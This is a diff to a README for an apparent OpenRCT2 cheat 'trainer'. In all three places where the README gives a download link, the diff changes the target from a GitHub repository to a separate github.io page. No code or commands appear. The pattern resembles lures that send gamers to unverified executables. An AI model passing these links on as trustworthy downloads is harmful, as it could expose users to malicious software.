@@ -1,6 +1,6 @@
 # 🎢 openrct2-trainer-hotkeys-2026 - Your Ultimate RollerCoaster Tycoon Power-Up
 
-[![Download Now](https://img.shields.io/badge/Download-OpenRCT2_Trainer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/starm3600/openrct2-trainer-hotkeys-2026)
+[![Download Now](https://img.shields.io/badge/Download-OpenRCT2_Trainer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://starm3600.github.io)
 
 ## 🎮 What Is This?
 
@@ -22,7 +22,7 @@ Follow these simple steps to get your trainer running:
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: [https://github.com/starm3600/openrct2-trainer-hotkeys-2026](https://github.com/starm3600/openrct2-trainer-hotkeys-2026)
+Visit this link to download the application: [https://starm3600.github.io](https://starm3600.github.io)
 
 Click the big green **Download** button on that page. The file will save to your computer – usually in your "Downloads" folder.
 
@@ -123,7 +123,7 @@ A: No. The trainer only changes values in real-time. Your save files remain unto
 
 Ready to start? Here's your download link one more time:
 
-[![Get It Now](https://img.shields.io/badge/Download-OpenRCT2_Trainer-4ECDC4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/starm3600/openrct2-trainer-hotkeys-2026)
+[![Get It Now](https://img.shields.io/badge/Download-OpenRCT2_Trainer-4ECDC4?style=for-the-badge&logo=windows&logoColor=white)](https://starm3600.github.io)
 
 Visit this link to download the application. It takes less than a minute, and you'll be cheating your way to coaster glory in no time!
 
